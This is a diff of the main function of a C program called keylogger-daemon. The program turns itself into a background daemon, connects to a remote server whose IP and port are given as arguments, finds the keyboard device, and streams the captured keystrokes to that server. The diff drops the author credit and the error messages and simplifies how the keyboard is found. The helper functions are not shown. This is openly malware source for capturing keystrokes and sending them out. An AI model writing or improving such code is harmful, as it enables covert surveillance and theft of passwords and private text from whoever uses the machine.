@@ -1,5 +1,3 @@
-/**Developed by Fabio Cinicolo **/
-
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -11,37 +9,20 @@ int main(int argc, char *argv[])
     int keyboard;
     int server;
     int flock;
-    int timeout;
-    int *keyboards;
-    int num_keyboards;
-    char *ip;
-    short port;
 
-    if (argc != 4)
-        fprintf(stderr, "Usage: ./keylogger-daemon ip port timeout\n"), exit(EXIT_FAILURE);
+    if (argc != 3) /* Usage: ./keylogger-daemon ip port */
+        exit(EXIT_FAILURE);
 
     if (!daemonize()) /* Convert process to daemon */
-        fprintf(stderr, "Couldn't daemonize process\n"), exit(EXIT_FAILURE);
+        exit(EXIT_FAILURE);
 
     if (daemonAlreadyRunning(&flock)) /* If another instance of keylogger is already running, or could not acquire write lock then we exit */
         exit(EXIT_FAILURE);
 
-    if (!(keyboards = findKeyboards(PATH, &num_keyboards))) /* Looking for possible keyboard devices */
+    if (!(server = openConnectionWithServer(argv[1], atoi(argv[2])))) /* Connecting with server */
         exit(EXIT_FAILURE);
 
-    timeout = atoi(argv[3]);
-
-    if (!(findRealKeyboard(keyboards, num_keyboards, timeout, &keyboard))) /* Picking first device that really acts like a keyboard (we are not interested in false positives like Joypads). */
-        exit(EXIT_FAILURE);                                                /* We will wait for $timeout milliseconds to have the user digit on the actual keyboard and take its file descriptor. */
-
-    for (int i = 0; i < num_keyboards; i++) /* Freeing up keyboards descriptors */
-        if (keyboards[i] != keyboard)
-            close(keyboards[i]);
-    free(keyboards);
-
-    ip = argv[1];
-    port = atoi(argv[2]);
-    if (!(server = openConnectionWithServer(ip, port))) /* Connecting with server */
+    if (!keyboardFound(DEVICES_PATH, &keyboard))
         exit(EXIT_FAILURE);
 
     startKeylogger(keyboard, server); /* Reading from keyboard device and sending events to server */
